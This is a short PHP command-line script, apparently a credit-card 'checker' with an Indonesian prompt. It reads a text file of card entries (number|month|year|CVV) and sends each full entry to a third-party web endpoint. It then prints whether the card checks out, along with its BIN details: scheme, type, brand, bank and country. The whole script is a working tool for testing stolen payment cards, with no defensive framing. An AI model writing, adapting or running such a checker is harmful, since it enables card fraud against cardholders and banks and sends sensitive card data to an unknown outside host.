<?php
// error_reporting(0); 
echo " ____  _  _  ____  ____  __  __ _  __ _  ____  ____  ____  \n";
echo "(_  _)/ )( \(  __)/ ___)(  )(  ( \(  ( \(  __)(  _ \/ ___) \n";
echo "  )(  ) __ ( ) _) \___ \ )( /    //    / ) _)  )   /\___ \ \n";
echo " (__) \_)(_/(____)(____/(__)\_)__)\_)__)(____)(__\_)(____/ \n";
echo "[?] Masukan List (.txt) 40002xxxxxxxxxxx|xx|xx|xxx : ";
$file = file(trim(fgets(STDIN)));
foreach ($file as $list => $data) {
$urls = trim($data);
$url = "https://bintangmuliapropertindo.com/api/api_cc.php?data=$urls";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Cache-Control: max-age=0';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);
// print_r($result);
$json = json_decode($result);
$code = $json->error;
$data = $json->data;
$info = $json->data->bins;
print_r($data->msg.'-'.$data->cc.'-'.$info->scheme.'-'.$info->type.'-'.$info->brand.'-'.$info->bank.'-'.$info->country."\n");
}

 ?>